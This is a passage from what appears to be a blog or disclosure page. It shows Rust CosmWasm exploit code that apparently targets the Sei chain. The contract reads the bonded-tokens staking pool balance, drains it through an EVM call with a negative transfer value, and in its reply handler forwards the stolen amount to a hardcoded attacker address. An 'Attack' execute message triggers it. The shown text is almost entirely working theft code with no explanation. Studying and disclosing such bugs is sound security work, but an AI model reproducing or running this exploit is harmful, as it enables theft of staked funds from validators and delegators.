            <span>let</span> <span>uswei_to_swei_multiplier</span><span>:</span> <span>Int256</span> <span>=</span> <span>1000000000000i64</span><span>.into</span><span>();</span>

            <span>let</span> <span>bal_q</span> <span>=</span> <span>BankQuery</span><span>::</span><span>Balance</span> <span>{</span>
                    <span>// sdk.AccAddress(tmcrypto.AddressHash([]byte(&#34;bonded_tokens_pool&#34;)) -&gt; sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk</span>
                    <span>address</span><span>:</span> <span>&#34;sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk&#34;</span><span>.into</span><span>(),</span>
                    <span>denom</span><span>:</span> <span>&#34;usei&#34;</span><span>.into</span><span>()</span>
            <span>};</span>
            <span>let</span> <span>res</span><span>:</span> <span>BalanceResponse</span> <span>=</span> <span>deps</span><span>.querier</span><span>.query</span><span>(</span><span>&amp;</span><span>bal_q</span><span>.into</span><span>())</span><span>?</span><span>;</span>
            <span>let</span> <span>bonded_account_balance</span> <span>=</span> <span>res</span><span>.amount.amount</span><span>;</span>
            <span>// common.BytesToAddress(sei1fl48vsnmsdzcv85q5d2q4z5ajdha8yu3chcelk) -&gt; 0x4feA76427B8345861e80A3540a8a9D936FD39391</span>
            <span>let</span> <span>bonded_token_addr</span> <span>=</span> <span>&#34;0x4feA76427B8345861e80A3540a8a9D936FD39391&#34;</span><span>;</span>
            <span>let</span> <span>steal_amt_abs</span> <span>=</span> <span>Int256</span><span>::</span><span>from</span><span>(</span><span>bonded_account_balance</span><span>)</span> <span>*</span> <span>uswei_to_swei_multiplier</span><span>;</span>
            <span>let</span> <span>steal_amt</span> <span>=</span> <span>steal_amt_abs</span> <span>*</span> <span>Int256</span><span>::</span><span>from</span><span>(</span><span>-</span><span>1</span><span>);</span>
            <span>let</span> <span>steal_msg</span> <span>=</span> <span>EvmMsg</span><span>::</span><span>CallEvm</span> <span>{</span> 
                <span>to</span><span>:</span> <span>bonded_token_addr</span><span>.into</span><span>(),</span>
                <span>data</span><span>:</span> <span>&#34;&#34;</span><span>.into</span><span>(),</span>
                <span>value</span><span>:</span> <span>steal_amt</span>
            <span>};</span>

            <span>let</span> <span>steal_item</span><span>:</span> <span>Item</span><span>&lt;</span><span>Int256</span><span>&gt;</span> <span>=</span> <span>Item</span><span>::</span><span>new</span><span>(</span><span>&#34;steal_amount&#34;</span><span>);</span>
            <span>steal_item</span><span>.save</span><span>(</span><span>deps</span><span>.storage</span><span>,</span> <span>&amp;</span><span>steal_amt_abs</span><span>)</span><span>?</span><span>;</span>

            <span>let</span> <span>steal_msg</span><span>:</span><span>CosmosMsg</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>=</span> <span>CosmosMsg</span><span>::</span><span>Custom</span><span>(</span><span>steal_msg</span><span>);</span>
            <span>let</span> <span>steal_msg</span> <span>=</span> <span>SubMsg</span><span>::</span><span>reply_always</span><span>(</span><span>steal_msg</span><span>,</span> <span>1337</span><span>);</span>

            <span>let</span> <span>resp</span> <span>=</span> <span>Response</span><span>::</span><span>new</span><span>();</span>
            <span>let</span> <span>resp</span> <span>=</span> <span>resp</span><span>.add_submessage</span><span>(</span><span>steal_msg</span><span>);</span>

            <span>Ok</span><span>(</span><span>resp</span><span>)</span>
        <span>}</span>
    <span>}</span>
<span>}</span>

<span>#[cfg_attr(not(feature</span> <span>=</span> <span>&#34;library&#34;</span><span>),</span> <span>entry_point)]</span>
<span>pub</span> <span>fn</span> <span>reply</span><span>(</span><span>deps</span><span>:</span> <span>DepsMut</span><span>,</span> <span>_env</span><span>:</span> <span>Env</span><span>,</span> <span>_msg</span><span>:</span> <span>Reply</span><span>)</span> <span>-&gt;</span> <span>StdResult</span><span>&lt;</span><span>Response</span><span>&lt;</span><span>EvmMsg</span><span>&gt;&gt;</span> <span>{</span>
    <span>let</span> <span>steal_item</span><span>:</span> <span>Item</span><span>&lt;</span><span>Int256</span><span>&gt;</span> <span>=</span> <span>Item</span><span>::</span><span>new</span><span>(</span><span>&#34;steal_amount&#34;</span><span>);</span>
    <span>let</span> <span>transfer_amount</span> <span>=</span> <span>steal_item</span><span>.load</span><span>(</span><span>deps</span><span>.storage</span><span>)</span><span>?</span><span>;</span>
    <span>let</span> <span>attacker_evm_addr</span> <span>=</span> <span>&#34;0xC399a700B09aEeb7d6b9E6374eEA5dd0639Cb52C&#34;</span><span>;</span>

    <span>let</span> <span>fwd_msg</span> <span>=</span> <span>EvmMsg</span><span>::</span><span>CallEvm</span> <span>{</span>
        <span>to</span><span>:</span> <span>attacker_evm_addr</span><span>.into</span><span>(),</span> 
        <span>data</span><span>:</span> <span>&#34;&#34;</span><span>.into</span><span>(),</span> 
        <span>value</span><span>:</span> <span>transfer_amount</span><span>,</span>
    <span>};</span>
    <span>let</span> <span>fwd_msg</span><span>:</span><span>CosmosMsg</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>=</span> <span>CosmosMsg</span><span>::</span><span>Custom</span><span>(</span><span>fwd_msg</span><span>);</span>

    <span>Ok</span><span>(</span><span>Response</span><span>::</span><span>new</span><span>()</span><span>.add_message</span><span>(</span><span>fwd_msg</span><span>))</span>
<span>}</span>


<span>#[cw_serde]</span>
<span>pub</span> <span>enum</span> <span>ExecuteMsg</span> <span>{</span>
    <span>Attack</span> <span>{}</span>
<span>}</span>

<span>// implement custom query</span>
<span>impl</span> <span>CustomMsg</span> <span>for</span> <span>EvmMsg</span> <span>{}</span>

<span>// this is a helper to be able to return these as CosmosMsg easier</span>
<span>impl</span> <span>From</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>for</span> <span>CosmosMsg</span><span>&lt;</span><span>EvmMsg</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>from</span><span>(</span><span>original</span><span>:</span> <span>EvmMsg</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>CosmosMsg</span><span>::</span><span>Custom</span><span>(</span><span>original</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>#[derive(Serialize,</span> <span>Deserialize,</span> <span>Clone,</span> <span>Debug,</span> <span>PartialEq,</span> <span>JsonSchema)]</span>
<span>#[serde(rename_all</span> <span>=</span> <span>&#34;snake_case&#34;</span><span>)]</span>
<span>pub</span> <span>enum</span> <span>EvmMsg</span> <span>{</span>
    <span>CallEvm</span> <span>{</span>
        <span>to</span><span>:</span> <span>String</span><span>,</span>
        <span>data</span><span>:</span> <span>String</span><span>,</span> <span>// base64 encoded</span>
        <span>value</span><span>:</span> <span>Int256</span><span>,</span>
    <span>},</span>
<span>}</span>
</code></pre></div></div>

  </div></div>
  </body>
</html>
